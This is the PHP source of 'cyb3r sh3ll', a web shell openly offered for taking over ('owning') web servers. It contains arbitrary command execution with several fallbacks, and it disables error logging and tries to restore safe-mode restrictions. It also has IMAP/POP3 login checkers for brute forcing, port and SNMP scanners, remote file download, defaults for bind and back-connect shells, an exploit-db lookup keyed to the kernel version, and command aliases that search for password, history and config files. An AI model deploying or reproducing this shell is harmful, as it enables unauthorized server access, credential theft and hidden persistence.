<?php
//Authentication
$lock = "on"; // set this to off if you dont need the login page
$user = "cyber";
$pass = "gladiator";
$antiCrawler 		= "on"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
$tracebackFeature 	= "off"; // set this feature to on to enable email alerts
$log_email = "cyb3r.gladiat0r@gmail.com"; //Default e-mail for sending logs

@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
error_reporting(5);
$phpVersion = phpversion();
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
$win = strtolower(substr(PHP_OS,0,3)) == "win";
$shver = "1.0"; //Current version
if (!function_exists("getmicrotime")) {
 function getmicrotime() {
  list($usec, $sec) = explode(" ", microtime()); 
  return ((float)$usec + (float)$sec);
  }
 }

define("starttime",getmicrotime());

if (get_magic_quotes_gpc()) {
 if (!function_exists("strips")) {
  function strips(&$arr,$k="") {
   if (is_array($arr)) {
    foreach($arr as $k=>$v) {
	 if (strtoupper($k) != "GLOBALS") {
	  strips($arr["$k"]);
	  }
	 }
	 } else {
	$arr = stripslashes($arr);
	}
	}
	} 
	strips($GLOBALS);
}

foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
if (!empty($unset_surl)) {setcookie("cyb3r_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("cyb3r_surl",$surl);}
else {$surl = $_REQUEST["cyb3r_surl"]; //Set this cookie for manual SURL

}
$surl_autofill_include = TRUE; //If TRUE then search variables with descriptors (URLs) and save it in SURL.
if ($surl_autofill_include and !$_REQUEST["cyb3r_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}

if (empty($surl))
{ $surl = "?".$includestr; }//Self url 
$surl = htmlspecialchars($surl);
$timelimit = 0; //time limit of execution this script over server quote (seconds), 0 = unlimited.

$welcome = "(: Welcome to the most advanced PHP Web Shell - cyb3r sh3ll :)";
//DON'T FORGOT ABOUT PASSWORD!!!

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$gzipencode = False; //Encode with gzip?

$ax4 ="http://"; 
$filestealth = TRUE; //if TRUE, don't change modify- and access-time

$donated_html = "<center><b>Owned by cyb3r.gladiat0r</b></center>";
$release = @php_uname('r'); 
$kernel = @php_uname('s'); 
$expltlink='http://www.exploit-db.com/search/?action=search&filter_exploit_text='; 
if( strpos('Linux', $kernel) !== false ) 
    $expltlink .= urlencode( 'Linux Kernel ' . substr($release,0,6) ); 
else 
    $expltlink .= urlencode( $kernel . ' ' . substr($release,0,3) );

/* If you publish free shell and you wish add link to your site or any other information, put here your html. */

$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.

$curdir = "./"; //start folder

//$curdir = getenv("DOCUMENT_ROOT");
$curdir = getcwd();
$tmpdir = ""; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)

$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)


$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending

$sort_save = TRUE; //If TRUE then save sorting-position using cookies.

if (substr((strtoupper(php_unamE())),0,3)=="WIN") $windows=1; else $windows=0;
function imaplogiN($host,$username,$password){
$sock=fsockopen($host,143,$n,$s,5);
$b=namE();
$l=strlen($b);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,"$b LOGIN $username $password\r\n");
$res=fgets($sock,$l+4);
if ($res == "$b OK")return 1;else return 0;
fclose($sock);
}
function pop3logiN($server,$user,$pass){
$sock=fsockopen($server,110,$en,$es,5);
if(!$sock)return -1;
fread($sock,1024);
fwrite($sock,"user $user\n");
$r=fgets($sock);
if($r{0}=='-')return 0;
fwrite($sock,"pass $pass\n");
$r=fgets($sock);
fclose($sock);
if($r{0}=='+')return 1;
return 0;
}
function check_urL($url,$method,$search,$timeout){
if(empty($search))$search='200';
$u=parse_url($url);
$method=strtoupper($method);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$data=(!empty($u['query']))?$u['query']:'';
if(!empty($data))$data="?$data";
$sock=@fsockopen($host,80,$en,$es,$timeout);
if($sock){
fputs($sock,"$method $file$data HTTP/1.0\r\n");
fputs($sock,"Host: $host\r\n");
if($method=='GET')fputs($sock,"\r\n");
elseif($method='POST')fputs($sock,"Content-Type: application/x-www-form-urlencoded\r\nContent-length: ".strlen($data)."\r\nAccept-Encoding: text\r\nConnection: close\r\n\r\n$data");
else return 0;
if($search=='200')if(substr(fgets($sock),0,3)=="200"){fclose($sock);return 1;}else {fclose($sock);return 0;}
while(!feof($sock)){
$res=trim(fgets($sock));
if(!empty($res))if(strstr($res,$search)){fclose($sock);return 1;}
}
fclose($sock);
}
return 0;
}
function snmpchecK($ip,$com,$timeout){
$res=0;
$n=chr(0x00);
$packet=chr(0x30).chr(0x26).chr(0x02).chr(0x01). chr(0x00). chr(0x04). chr(strlen($com)). 
$com. chr(0xA0). 
chr(0x19). chr(0x02). chr(0x01). chr(0x01). chr(0x02). chr(0x01). $n.
chr(0x02). chr(0x01). $n. chr(0x30). chr(0x0E). chr(0x30). chr(0x0C).
chr(0x06). chr(0x08). chr(0x2B). chr(0x06). chr(0x01). chr(0x02). chr(0x01).
chr(0x01). chr(0x01). $n. chr(0x05). $n;
$sock=@fsockopen("udp://$ip",161);
socket_set_timeout($sock,$timeout);
@fputs($sock,$packet);
socket_set_timeout($sock,$timeout);
$res=fgets($sock);
fclose($sock);
return $res;
}
function checkthisporT($ip,$port,$timeout,$type=0){
if(!$type){
$scan=@fsockopen($ip,$port,$n,$s,$timeout);
if($scan){fclose($scan);return 1;}
}
elseif(function_exists('socket_set_timeout')){
$scan=@fsockopen("udp://".$ip,$port);
if($scan){
socket_set_timeout($scan,$timeout);
@fwrite($scan,"\x00");
$s=time();
fread($scan,1);
if((time()-$s)>=$timeout){fclose($scan);return 1;}
}
}
return 0;
}
function get_sw_namE($host,$timeout){
$sock=@fsockopen($host,80,$en,$es,$timeout);
if($sock){
$page=namE().namE();
fputs($sock,"GET /$page HTTP/1.0\r\n\r\n");
while(!feof($sock)){
$con=fgets($sock);
if(strstr($con,'Server:')){$ser=substr($con,strpos($con,' ')+1);return $ser;}
}
fclose($sock);
return -1;
}return 0;
}
function getDisabledFunctions(){
    if(!ini_get('disable_functions'))
    {
		echo "None";
    }
    else
    {
			echo @ini_get('disable_functions');
    }
}
function showsizE($size){
if ($size>=1073741824)$size = round(($size/1073741824) ,2)." GB";
elseif ($size>=1048576)$size = round(($size/1048576),2)." MB";
elseif ($size>=1024)$size = round(($size/1024),2)." KB";
else $size .= " B";
return $size;
}
function whereistmP(){
$uploadtmp=ini_get('upload_tmp_dir');
$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
return ".";
}
function downloadiT($get,$put){
$fo=@strtolower(ini_get('allow_url_fopen'));
if($fo || $fo=='on')$con=file_get_contents($get);
else{
$u=parse_url($get);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';
$url=fsockopen($host, 80, $en, $es, 12);
fputs($url, "GET $file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
$tmp=$con='';
while($tmp!="\r\n")$tmp=fgets($url);
while(!feof($url))$con.=fgets($url);
}
$mk=file_put_contents($put,$con);
if($mk)return 1;
return 0;
}
function flusheR(){
flush();@ob_flush();
}
function namE(){
$name='';
srand((double)microtime()*100000);
for ($i=0;$i<=rand(3,10);$i++){
$name.=chr(rand(97,122));
}
return $name;
}
function hlinK($str=""){
$myvars=array('workingdiR','urL','imagE','namE','filE','downloaD','sec','cP','mV','rN','deL');
$ret=$_SERVER['PHP_SELF']."?";
$new=explode("&",$str);
foreach ($_GET as $key => $v){
$add=1;
foreach($new as $m){
$el = explode("=", $m);
if ($el[0]==$key)$add=0;
}
if($add)if(!in_array($key,$myvars))$ret.=$key."=".$v."&";
}
$ret.=$str;
return $ret;
}
function shelL($command){
global $windows,$disablefunctions;
$exec = '';$output= '';
$dep[]=array('pipe','r');$dep[]=array('pipe','w');
if(is_callable('passthru') && !strstr($disablefunctions,'passthru')){ @ob_start();passthru($command);$exec=@ob_get_contents();@ob_clean();@ob_end_clean();}
elseif(is_callable('system') && !strstr($disablefunctions,'system')){$tmp = @ob_get_contents(); @ob_clean();system($command) ; $output = @ob_get_contents(); @ob_clean(); $exec= $tmp; }
elseif(is_callable('exec') && !strstr($disablefunctions,'exec')) {exec($command,$output);$output = join("\n",$output);$exec= $output;}
elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}
elseif(is_resource($output=popen($command,"r"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}
elseif(is_resource($res=proc_open($command,$dep,$pipes))){while(!feof($pipes[1])){$line = fgets($pipes[1]); $output.=$line;}$exec= $output;proc_close($res);}
elseif ($windows && is_object($ws = new COM("WScript.Shell"))){$dir=(isset($_SERVER["TEMP"]))?$_SERVER["TEMP"]:ini_get('upload_tmp_dir') ;$name = $_SERVER["TEMP"].namE();$ws->Run("cmd.exe /C $command >$name", 0, true);$exec = file_get_contents($name);unlink($name);}
return $exec;
}
// Registered file-types.
//  array(
//   "{action1}"=>array("ext1","ext2","ext3",...),
//   "{action2}"=>array("ext4","ext5","ext6",...),
//   ...
//  )
$ftypes  = array(
 "html"=>array("html","htm","shtml"),
 "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
 "exe"=>array("sh","install","bat","cmd"),
 "ini"=>array("ini","inf"),
 "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
 "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=>array("sdb"),
 "phpsess"=>array("sess"),
 "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
// Registered executable file-types.
//  array(
//   string "command{i}"=>array("ext1","ext2","ext3",...),
//   ...
//  )
//   {command}: %f% = filename
$exeftypes  = array(
 getenv("PHPRC")." -q %f%" => array("php","php3","php4"),
 "perl %f%" => array("pl","cgi")
);
/* Highlighted files.
  array(
   i=>array({regexp},{type},{opentag},{closetag},{break})
   ...
  )
  string {regexp} - regular exp.
  int {type}:
0 - files and folders (as default),
1 - files only, 2 - folders only
 string {opentag} - open html-tag, e.g. "<b>" (default)
  string {closetag} - close html-tag, e.g. "</b>" (default)
  bool {break} - if TRUE and found match then break
*/
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"<font color=\"yellow\">","</font>"), // example
  array("config.php",1) // example
);
$safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
 // array (i=>{letter} ...); string {letter} - letter of a drive
//$safemode_diskettes = range("a","z");
$hexdump_lines = 8;// lines in hex preview file
$hexdump_rows = 24;// 16, 24 or 32 bytes in one line
$cx7 =".com"; 
$nixpwdperpage = 100; // Get first N lines from /etc/passwd
$bindport_pass = "cyb3r";  // default password for binding
$bindport_port = "31373"; // default port for binding
$bc_port = "31373"; // default port for back-connect
$cx4 ="/x."; 
$datapipe_localport = "8081"; // default port for datapipe
// Command-aliases
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find all suid files", "find / -type f -perm -04000 -ls"),
  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
  array("find all sgid files", "find / -type f -perm -02000 -ls"),
  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
}
else
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}
$sess_cookie = "cyb3rvars"; // Cookie-variable name
$usefsbuff = TRUE; //Buffer-function
$px7 ="html";  
$copy_unset = FALSE; //Remove copied files from buffer after pasting
//Quick launch
$quicklaunch = array(
 array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\" height=\"20\" width=\"20\" border=\"0\">",$surl),
 array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)"),
 array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)"),
 array("<img src=\"".$surl."act=img&img=up\" alt=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
 array("<img src=\"".$surl."act=img&img=refresh\" alt=\"Refresh\" height=\"20\" width=\"17\" border=\"0\">",""),
 array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d"),
 array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d"),
 array("<b>Encoder</b>",$surl."act=encoder&d=%d"),
 array("<b>Shell</b>",$surl."act=shells&d=%d"),
 array("<b>Cracker</b>",$surl."act=cracker&d=%d"),
 array("<b>Scanner</b>",$surl."act=scanner&d=%d"),
 array("<b>Net Tools</b>",$surl."act=nettools&d=%d"),
 array("<b>SQL</b>",$surl."act=sql&d=%d"),
 array("<b>PHP-code</b>",$surl."act=phpcode&d=%d"),
 array("<b>Mailer</b>",$surl."act=mailer&d=%d"),   //update this section copy from b3t4k shell hardeep
 array("<b>DOS</b>",$surl."act=dos&d=%d"),   //update this section copy from b3t4k shell hardeep
 array("<b>Local Domain</b>",$surl."act=localdomain&d=%d"), //update this section copy from b3t4k shell hardeep
 array("<b>Upload</b>",$surl."act=upload&d=%d"),
 array("<b>About</b>",$surl."act=about&d=%d"),   //update this section copy from b3t4k shell hardeep
 );
//Highlight-code colors
$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";
@$f = $_REQUEST["f"];
@extract($_REQUEST["cyb3rcook"]);
//END CONFIGURATION
// -------------- Traceback Functions
function sendLoginAlert()
{
    global $ownerEmail;
    global $url;
	$ref=$_SERVER['HTTP_REFERER'];
	$agent=$_SERVER['HTTP_USER_AGENT'];
    $accesedIp = $_SERVER['REMOTE_ADDR'];
    $randomInt = rand(0,1000000);           # to avoid id blocking
    $from = "cyb3r-sh3ll$randomInt@cyb3r.gladiat0r.com"; 
     //echo $from;
     if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- cyb3r-Sh3ll --";
        $message = "
Hey Owner ,
        
        Your Shell(cyb3r-Sh3ll) located at $url was accessed by $accesedIp this mail refered by $ref 
		Your shell was accesed by $agent
     
        If its not you :-
        
        1. Please check if the shell is secured.
        2. Change your user name and Password.
        3. Check if lock is 0n!

        Thanking You
        
Yours Faithfully
cyb3r Sh3ll
        ";
        mail($ownerEmail,$subject,$message,'From:'.$from);
    }
}

//---------------------------------------------------------
if(function_exists('session_start') && $lock == 'on')
{
    session_start();
}
else
{
    // The lock will be set to 'off' if the session_start fuction is disabled i.e if sessions are not supported 
    $lock = 'off';
} 

//logout
if(isset($_GET['logout']) && $lock == 'on')
{
    $_SESSION['authenticated'] = 0;
    session_destroy();
    header("location: ".$_SERVER['PHP_SELF']);
}

/***************** Restoring *******************************/
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");
if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
    ini_set('file_uploads',1);  // Enable file uploads
    ini_set('allow_url_fopen',1);   // allow url fopen 
}

else
{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}
// ----------------------------------------------------------------------------------------------------------------
// \/Next code isn't for editing\/
@set_time_limit(0);
$tmp = array();
foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"#\">cyb3r sh3ll</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us">
<title>cyb3r sh3ll | India - <?php echo getenv("HTTP_HOST"); ?></title>
<?php
if($antiCrawler != 'off')
{
    ?>
    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
    <?php
}
?>
<STYLE>
TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #15354C; scrollbar-shadow-color: #15354C; scrollbar-highlight-color: #15354C; scrollbar-3dlight-color: #15354C scrollbar-darkshadow-color: #15354C; scrollbar-track-color: #050E14; scrollbar-arrow-color: #D9D9D9; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #2b3b46; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #2b3b46; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #2b3b46; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #050e14;}</style>
</head>
<BODY text=#ffffff bottomMargin=0 bgColor=#050e14 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>
<?php
if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
{
    if( $_POST['user'] == $user &&
         $_POST['pass'] == $pass )
    {
            $_SESSION['authenticated'] = 1;
            // --------------------- Tracebacks --------------------------------
            if($tracebackFeature == 'On')
            {
                sendLoginAlert();
            }
            // ------------------------------------------------------------------
    }
}

if($lock == 'off')
{?>
    <p><font color=red><b>Lock is Switched Off! , The shell can be accessed by anyone!</b></font></p>
<?php
}

if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!=1) )
{

?>
<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark='#666666' cellPadding=5 width="100%" bgColor='#15354c' borderColorLight='#c0c0c0' border=1 bordercolor='#C0C0C0'>
<tr><td valign='top'><center><font face="times, serif" size="3" color="white">Welcome to the most advanced PHP web Shell- <b><font color=orange>cyb</font>3r Sh<font color=green>3ll</font></b> :: By cyb3r gl4d!470r ...</font></center></td>
</tr>
</table>
<br/>


<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark='#666666' cellPadding=5 width="100%" bgColor=#15354c borderColorLight=#c0c0c0 border=0 bordercolor='#C0C0C0'>
<tr>

<td width="50%"><center><img src="http://s15.postimage.org/94kp4a0ej/indian_flag.png" /></center></td>
<td><center><img src="http://s15.postimage.org/whiqmsgi3/gladiator.png" width="352px" height="500px"/></center></td>
</tr>
</table>
<div style="position:absolute; border-style:solid;border-width:0px; top:280px;left:280px; right:430px; bottom:180px;" >
<center><font face="times, serif" color="white">
	 <h1><?php echo $welcome; ?></h1><br /><br />
      <form method="POST" action="">
      <input name="user" value="Username"/> <input name="pass" type="password" value="Password"/> <input type="Submit" value="Own This Box!"/>
      </form>
	  <font size="3">Coded by cyb3r 9ladiat0r for all hacking communities working for my motherland.......<br/><br/>
	  
	  Always there to serve my country, My India on any Terms...</font>
	  
	  </font>
</center>
</div>
<br/>
<?php
}
//---------------------------------- We are authenticated now-------------------------------------
//Launch the shell
else 
{

if ($act != "img")

{

$lastdir = realpath(".");

chdir($curdir);

if ($selfwrite or $updatenow) {@ob_clean(); cyb3r_getupdate($selfwrite,1); exit;}

$sess_data = unserialize($_COOKIE["$sess_cookie"]);

if (!is_array($sess_data)) {$sess_data = array();}

if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}

if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}



$disablefunc = @ini_get("disable_functions");

if (!empty($disablefunc))

{

 $disablefunc = str_replace(" ","",$disablefunc);

 $disablefunc = explode(",",$disablefunc);

}



if (!function_exists("cyb3r_buff_prepare"))

{

function cyb3r_buff_prepare()

{

 global $sess_data;

 global $act;

 foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}

 foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}

 $sess_data["copy"] = array_unique($sess_data["copy"]);

 $sess_data["cut"] = array_unique($sess_data["cut"]);

 sort($sess_data["copy"]);

 sort($sess_data["cut"]);

 if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}

 else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}

}

}

cyb3r_buff_prepare();

if (!function_exists("cyb3r_sess_put"))

{

function cyb3r_sess_put($data)

{

 global $sess_cookie;

 global $sess_data;

 cyb3r_buff_prepare();

 $sess_data = $data;

 $data = serialize($data);

 setcookie($sess_cookie,$data);

}

}

foreach (array("sort","sql_sort") as $v)

{

 if (!empty($_GET[$v])) {$$v = $_GET[$v];}

 if (!empty($_POST[$v])) {$$v = $_POST[$v];}

}

if ($sort_save)

{

 if (!empty($sort)) {setcookie("sort",$sort);}

 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}

}

if (!function_exists("str2mini"))

{

function str2mini($content,$len)

{

 if (strlen($content) > $len)

 {

  $len = ceil($len/2) - 2;

  return substr($content, 0,$len)."...".substr($content,-$len);

 }

 else {return $content;}

}

}

if (!function_exists("view_size"))

{

function view_size($size)

{

 if (!is_numeric($size)) {return FALSE;}

 else

 {

  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}

  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}

  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}

  else {$size = $size . " B";}

  return $size;

 }

}

}

if (!function_exists("fs_copy_dir"))

{

function fs_copy_dir($d,$t)

{

 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

 $h = opendir($d);

 while (($o = readdir($h)) !== FALSE)

 {

  if (($o != ".") and ($o != ".."))

  {

   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}

   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}

   if (!$ret) {return $ret;}

  }

 }

 closedir($h);

 return TRUE;

}

}

if (!function_exists("fs_copy_obj"))

{

function fs_copy_obj($d,$t)

{

 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);

 if (!is_dir(dirname($t))) {mkdir(dirname($t));}

 if (is_dir($d))

 {

  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}

  return fs_copy_dir($d,$t);

 }

 elseif (is_file($d)) {return copy($d,$t);}

 else {return FALSE;}

}

}

if (!function_exists("fs_move_dir"))

{

function fs_move_dir($d,$t)

{

 $h = opendir($d);

 if (!is_dir($t)) {mkdir($t);}

 while (($o = readdir($h)) !== FALSE)

 {

  if (($o != ".") and ($o != ".."))

  {

   $ret = TRUE;

   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}

   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}

   if (!$ret) {return $ret;}

  }

 }

 closedir($h);

 return TRUE;

}

}

if (!function_exists("fs_move_obj"))

{

function fs_move_obj($d,$t)

{

 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);

 if (is_dir($d))

 {

  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}

  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}

  return fs_move_dir($d,$t);

 }

 elseif (is_file($d))

 {

  if(copy($d,$t)) {return unlink($d);}

  else {unlink($t); return FALSE;}

 }

 else {return FALSE;}

}

}

if (!function_exists("fs_rmdir"))

{

function fs_rmdir($d)

{

 $h = opendir($d);

 while (($o = readdir($h)) !== FALSE)

 {

  if (($o != ".") and ($o != ".."))

  {

   if (!is_dir($d.$o)) {unlink($d.$o);}

   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}

  }

 }

 closedir($h);

 rmdir($d);

 return !is_dir($d);

}

}

if (!function_exists("fs_rmobj"))

{

function fs_rmobj($o)

{

 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);

 if (is_dir($o))

 {

  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}

  return fs_rmdir($o);

 }

 elseif (is_file($o)) {return unlink($o);}

 else {return FALSE;}

}

}

if (!function_exists("myshellexec"))

{

function myshellexec($cmd)

{

 global $disablefunc;

 $result = "";

 if (!empty($cmd))

 {

  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}

  elseif (($result = `$cmd`) !== FALSE) {}

  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}

  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}

  elseif (is_resource($fp = popen($cmd,"r")))

  {

   $result = "";

   while(!feof($fp)) {$result .= fread($fp,1024);}

   pclose($fp);

  }

 }

 return $result;

}

}

